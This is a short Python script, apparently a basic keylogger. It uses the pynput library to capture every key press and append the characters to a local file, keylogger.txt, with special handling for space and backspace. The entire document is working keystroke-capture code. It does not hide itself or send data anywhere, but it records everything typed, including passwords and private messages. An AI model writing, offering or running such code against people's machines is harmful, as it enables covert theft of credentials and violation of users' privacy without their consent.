from pynput import keyboard

def recording_keystrokes(key):
  
  try:
    if key == keyboard.Key.space:
      character = ' '
    
    elif key == keyboard.Key.backspace:
      
      with open("keylogger.txt", 'r+') as logging_file:  
        contents = logging_file.read()[:-1]  
        logging_file.seek(0)  
        logging_file.write(contents)
      return 
    
    else:
      character = key.char

    with open("keylogger.txt", 'a') as logging_file:
      logging_file.write(character)
      logging_file.write('') 

  except (AttributeError, FileNotFoundError) as e:
    print("Error:", e)

if __name__ == '__main__':
  
  try:
    with keyboard.Listener(on_press=recording_keystrokes) as listener:
      listener.join()

  except Exception as e:
    print("An error occurred:", e)
